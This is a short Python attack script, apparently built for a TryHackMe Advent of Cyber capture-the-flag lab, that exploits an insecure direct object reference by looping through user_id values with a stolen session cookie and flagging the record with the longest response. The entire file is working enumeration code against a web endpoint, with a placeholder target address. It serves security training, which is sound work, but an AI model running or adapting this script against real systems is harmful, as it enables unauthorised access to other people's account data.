import requests

# === IDOR Enumeration Tool - TryHackMe AoC 2025 Day 5 Inspired ===
# Target: http://MACHINE_IP:PORT/ (update below)
BASE_URL = "http://10.200.100.101:5000/view"  # Change to your target
PARAM = "user_id"  # or "view_accounts" depending on the app
SESSION_COOKIE = {"session": "your_session_cookie_here"}  # Grab from browser


def check_user(user_id):
    params = {PARAM: user_id}
    try:
        r = requests.get(BASE_URL, params=params, cookies=SESSION_COOKIE, timeout=10)
        # Heuristic: longer response = more children listed
        length = len(r.text)
        if "No children" in r.text or "Error" in r.text:
            return None
        print(f"[+] ID {user_id} -> Response length: {length}")
        return length
    except:
        return None


if __name__ == "__main__":
    print("[*] Starting IDOR enumeration...")
    max_length = 0
    target_id = None
    for uid in range(1, 50):  # Adjust range as needed
        length = check_user(uid)
        if length and length > max_length:
            max_length = length
            target_id = uid
    if target_id:
        print(f"\n[!] Likely target (most children): user_id = {target_id}")
        print(f"    Response length: {max_length}")
